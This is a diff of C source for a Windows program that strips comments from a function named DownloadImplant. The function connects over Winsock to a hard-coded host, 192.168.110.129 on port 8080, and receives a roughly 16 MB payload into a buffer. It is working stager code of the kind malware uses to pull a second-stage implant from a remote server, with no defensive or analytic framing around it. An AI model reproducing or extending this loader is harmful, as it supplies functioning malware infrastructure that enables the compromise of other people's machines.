@@ -9,11 +9,11 @@
 #pragma comment(lib,"ws2_32.lib")
 #define PAYLOAD_SIZE 15996216
 
-//Function Declaration
+
 void DownloadImplant();
 
 
-//Global variable payload
+
 unsigned char data[PAYLOAD_SIZE];
 
 
@@ -56,15 +56,15 @@ void DownloadImplant() {
         exit(1);
     }
 
-    // Create socket
+  
     if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
 
         exit(1);
     }
 
     InetPtonA(AF_INET, "192.168.110.129", &cleanServer.sin_addr.s_addr);
-    cleanServer.sin_family = AF_INET; // IPv4 Protocol
-    cleanServer.sin_port = htons(8080); // Port number
+    cleanServer.sin_family = AF_INET; 
+    cleanServer.sin_port = htons(8080);
 
     // Connect to server
     if (connect(s, (struct sockaddr*)&cleanServer, sizeof(cleanServer)) == SOCKET_ERROR) {
@@ -74,7 +74,7 @@ void DownloadImplant() {
         exit(1);
     }
 
-    // Receive data in a loop until the expected size is received
+   
     while (total_received < PAYLOAD_SIZE) {
         response_size = recv(s, (char*)data + total_received, PAYLOAD_SIZE - total_received, 0);
         if (response_size == SOCKET_ERROR) {
@@ -84,7 +84,7 @@ void DownloadImplant() {
             exit(1);
         }
         else if (response_size == 0) {
-            // Connection closed by the server
+           
 
             break;
         }
@@ -93,7 +93,7 @@ void DownloadImplant() {
 
 
 
-    // Close the socket
+   
     closesocket(s);
     WSACleanup();
 }
